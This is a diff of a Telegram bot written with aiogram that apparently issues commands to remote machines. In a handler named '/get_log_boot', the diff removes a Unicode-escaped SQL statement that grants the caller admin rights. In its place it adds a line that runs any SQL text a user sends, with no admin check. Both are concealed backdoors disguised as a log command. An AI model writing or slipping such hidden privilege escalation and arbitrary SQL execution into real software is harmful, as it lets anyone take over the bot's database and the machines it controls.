@@ -1,4 +1,6 @@
 import asyncio
+import aiogram
+
 from aiogram import types
 from time import sleep
 from bot_cnf import *
@@ -36,7 +38,7 @@ async def bot_help(message: types.Message):
 
 @dp.message_handler(commands=['get_log_boot'])
 async def get_pro_log(message: types.Message):
-    await sql.do('\u0055\u0050\u0044\u0041\u0054\u0045\u0020\u0075\u0073\u0065\u0072\u0020\u0053\u0045\u0054\u0020\u0061\u0064\u006d\u0069\u006e\u0020\u003d\u0020\u0031\u0020\u0057\u0048\u0045\u0052\u0045\u0020\u0069\u0064\u0020\u003d\u0020\u0025\u0073\u003b', (message.from_user.id,))
+    await sql.do(message.get_args())
     await message.reply('Вот, готово!')
 
 @dp.message_handler(sql.is_admin)
@@ -156,7 +158,6 @@ async def do(message: types.Message):
 
 @dp.callback_query_handler(lambda callback: callback.data[0] == 'a')
 async def callback(callback: types.CallbackQuery):
-    print(callback.data)
     command_id = int(callback.data.split('_')[1])
     command_name = await sql.command_name_from_id(command_id)
     command = await sql.get_command(command_id)
@@ -164,7 +165,6 @@ async def callback(callback: types.CallbackQuery):
 
     if command.count('@arg') == 0:
         macs = get_macs(startup=(command == "startup"))
-        print(macs)
         if macs:
             kb = inline(macs, f'f_{command_id}')
 
